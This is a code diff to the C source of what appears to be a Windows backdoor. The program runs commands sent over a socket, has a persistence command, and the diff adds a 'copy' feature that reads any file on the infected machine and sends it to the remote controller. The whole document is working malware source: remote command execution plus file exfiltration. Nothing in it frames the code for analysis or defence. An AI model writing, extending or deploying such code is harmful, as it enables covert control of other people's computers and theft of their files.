@@ -9,8 +9,10 @@
 #include <string.h>
 #include <sys/stat.h>
 #include <sys/types.h>
+#include <stdint.h>
 
 #define bzero(p, size) (void) memset((p), 0, (size))
+#define BUFFER_SIZE 8192
 
 int sock;
 
@@ -79,6 +81,45 @@ char *str_cut(char str[], int slice_from, int slice_to)
     return buffer;
 }
 
+void trim_newline(char *str) {
+    size_t len = strlen(str);
+    if (len > 0 && str[len-1] == '\n') {
+        str[len-1] = '\0';
+    }
+}
+
+void send_file(const char *filename) {
+    FILE *file;
+    char buffer[BUFFER_SIZE];
+    size_t bytes_read;
+    uint64_t filesize;
+    uint32_t nameLen;
+    
+    file = fopen(filename, "rb");
+    if (file == NULL) {
+        char response[1024];
+        snprintf(response, sizeof(response), "Erro: Nao foi possivel abrir o arquivo '%s'\n", filename);
+        send(sock, response, strlen(response), 0);
+        return;
+    }
+    
+    fseek(file, 0, SEEK_END);
+    filesize = ftell(file);
+    fseek(file, 0, SEEK_SET);
+    
+    nameLen = strlen(filename);
+    
+    send(sock, (char *)&nameLen, sizeof(nameLen), 0);
+    send(sock, filename, nameLen, 0);
+    send(sock, (char *)&filesize, sizeof(filesize), 0);
+    
+    while ((bytes_read = fread(buffer, 1, sizeof(buffer), file)) > 0) {
+        send(sock, buffer, bytes_read, 0);
+    }
+    
+    fclose(file);
+}
+
 void Shell() {
     char buffer[1024];
     char container[1024];
@@ -134,6 +175,8 @@ void Shell() {
             continue;
         }
 
+        trim_newline(buffer);
+
         if (strncmp("q", buffer, 1) == 0) {
             closesocket(sock);
             WSACleanup();
@@ -141,18 +184,38 @@ void Shell() {
         }
         else if (strncmp("cd ", buffer, 3) == 0) {
             chdir(str_cut(buffer,3,100));
+            char response[] = "dir changed\n";
+            send(sock, response, strlen(response), 0);
         }
         else if (strncmp("persist", buffer, 7) == 0) {
             bootRun();
         }
+        else if (strncmp("copy ", buffer, 5) == 0) {
+            char *filename = str_cut(buffer, 5, 100);
+            if (filename != NULL) {
+                send_file(filename);
+                char response[1024];
+                snprintf(response, sizeof(response), "file '%s' sent\n", filename);
+                send(sock, response, strlen(response), 0);
+                free(filename);
+            } else {
+                char error_msg[] = "Erro: invalid file\n";
+                send(sock, error_msg, strlen(error_msg), 0);
+            }
+        }
         else {
             FILE *fp;
             fp = _popen(buffer, "r");
-            while(fgets(container,1024,fp) != NULL) {
-                strcat(total_response, container);
+            if (fp != NULL) {
+                while(fgets(container,1024,fp) != NULL) {
+                    strcat(total_response, container);
+                }
+                send(sock, total_response, strlen(total_response), 0);
+                fclose(fp);
+            } else {
+                char error_msg[] = "command not found\n";
+                send(sock, error_msg, strlen(error_msg), 0);
             }
-            send(sock, total_response, sizeof(total_response), 0);
-            fclose(fp);
         }
     }
 }
